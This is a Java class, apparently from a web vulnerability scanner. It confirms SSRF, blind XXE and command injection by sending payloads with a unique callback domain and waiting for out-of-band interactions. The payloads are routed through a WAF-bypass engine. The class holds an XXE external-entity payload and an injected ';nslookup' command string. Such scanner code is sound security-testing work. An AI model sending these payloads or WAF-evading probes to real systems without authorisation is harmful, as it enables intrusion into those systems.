package com.crushed.detectors;

import com.crushed.identitydiff.ReplayResult;
import com.crushed.model.IssueType;
import com.crushed.oast.OastCorrelator;
import com.crushed.oast.PendingProbe;
import com.crushed.ui.ActivityLog;

import java.util.UUID;
import java.util.function.Function;

/**
 * Shared logic for vuln classes that can only be confirmed out-of-band: SSRF, XXE (blind),
 * and RCE. A payload embedding a unique OAST correlation-id is sent; if the target actually
 * resolves/executes it, an interaction arrives later and OastCorrelator promotes the finding
 * to CONFIRMED asynchronously — this method just registers the probe, it does not block.
 */
public final class OastConfirmedDetector {

    private final WafBypassEngine bypassEngine;
    private final OastCorrelator correlator;
    private final ActivityLog activityLog;
    private final String oastBaseDomain;

    public OastConfirmedDetector(WafBypassEngine bypassEngine, OastCorrelator correlator,
                                  ActivityLog activityLog, String oastBaseDomain) {
        this.bypassEngine = bypassEngine;
        this.correlator = correlator;
        this.activityLog = activityLog;
        this.oastBaseDomain = oastBaseDomain;
    }

    /** payloadTemplate must contain the literal token "{OAST}" where the callback host should go. */
    public void probeAsync(int historyId, String endpointKey, IssueType issueType, String technique,
                            String payloadTemplate, Function<String, ReplayResult> sender) {
        String correlationId = UUID.randomUUID().toString().replace("-", "").substring(0, 16);
        String callbackHost = correlationId + "." + oastBaseDomain;
        String payload = payloadTemplate.replace("{OAST}", callbackHost);

        bypassEngine.sendWithAutoBypass(historyId, "OastConfirmedDetector:" + issueType, payload, sender, r -> true);

        correlator.registerProbe(new PendingProbe(correlationId, historyId, endpointKey, issueType, technique));
        activityLog.info("OastConfirmedDetector", historyId,
                "Planted OAST probe for " + issueType + " on " + endpointKey + " (awaiting callback on " + callbackHost + ")");
    }

    public static String ssrfPayload() {
        return "http://{OAST}/";
    }

    public static String xxeBlindPayload() {
        return "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://{OAST}/\">%xxe;]>";
    }

    public static String rceOobPayload() {
        return ";nslookup {OAST};";
    }
}
